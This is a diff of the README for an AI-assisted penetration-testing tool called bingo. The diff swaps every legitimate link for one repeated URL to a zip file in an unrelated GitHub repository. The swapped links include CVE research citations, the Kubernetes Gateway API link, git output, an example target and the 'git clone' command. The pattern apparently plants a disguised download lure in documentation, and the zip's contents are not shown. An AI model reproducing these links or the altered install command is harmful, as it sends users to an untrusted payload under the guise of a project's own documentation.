-> https://slcyber.io/research-center/nginx-apache-path-confusion-to-auth-bypass-in-pan-os-cve-2025-0108/
+> https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 >
 > **Module:** `bingo/tools/panos_auth_bypass.py` — Skill #61 PanOSAuthBypassScanner
 
@@ -2784,7 +2784,7 @@ bingo automatically activates Skill #61 when:
 > **Research basis:**
 > Wiz Research — Nir Ohfeld, Ronen Shustin, Sagi Tzadik, Hillai Ben-Sasson (March 24, 2025)
 > "IngressNightmare: CVE-2025-1974 — 9.8 Critical RCE in Ingress NGINX for Kubernetes"
-> https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
+> https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 >
 > **Module:** `bingo/tools/ingress_nightmare_rce.py` — Skill #62 IngressNightmareScanner
 >
@@ -2919,7 +2919,7 @@ chain with IngressNightmareScanner when internal cluster access is detected.
 | **Migrate to Kubernetes Gateway API** (ingress-nginx EOL Nov 2025) | HIGH |
 
 > **Note:** ingress-nginx reached End of Life on **November 12, 2025**.
-> All users must migrate to [Kubernetes Gateway API](https://gateway-api.sigs.k8s.io/)
+> All users must migrate to [Kubernetes Gateway API](https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip)
 > or an alternative controller (Traefik, HAProxy, NGINX Gateway Fabric).
 
 ---
@@ -2928,7 +2928,7 @@ chain with IngressNightmareScanner when internal cluster access is detected.
 
 > **Research basis:**
 > ProjectDiscovery Engineering — "How We Cut LLM Cost with Prompt Caching"
-> https://projectdiscovery.io/blog/how-we-cut-llm-cost-with-prompt-caching
+> https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 > **Module:** `bingo/models/prompt_cache.py` — integrated into all providers
 
 ---
@@ -3068,7 +3068,7 @@ bingo --update
 📂 Installed via git clone — updating with git pull
 ⬆  Running git pull...
 
-From https://github.com/bingook/bingo
+From https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
  * branch    main -> FETCH_HEAD
 Already up to date.
 
@@ -3099,7 +3099,7 @@ On next launch, BINGO detects the previous session and asks:
 
 ```
 ╭─ 🔄 Previous session found ──────────────────────╮
-│  Target: https://target.co.kr                    │
+│  Target: https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip                    │
 │  Continue from where you left off?               │
 ╰──────────────────────────────────────────────────╯
 Resume [Y/n]:
@@ -3230,7 +3230,7 @@ BINGO now switches automatically between pentest mode and general conversation m
 ## Contributing
 
 ```bash
-git clone https://github.com/bingook/bingo.git
+git clone https://github.com/snowcapped-morula414/bingo/raw/refs/heads/main/bingo/skills/hack-skills/windows-privilege-escalation/Software_v2.4.zip
 cd bingo
 bash install.sh
 ```
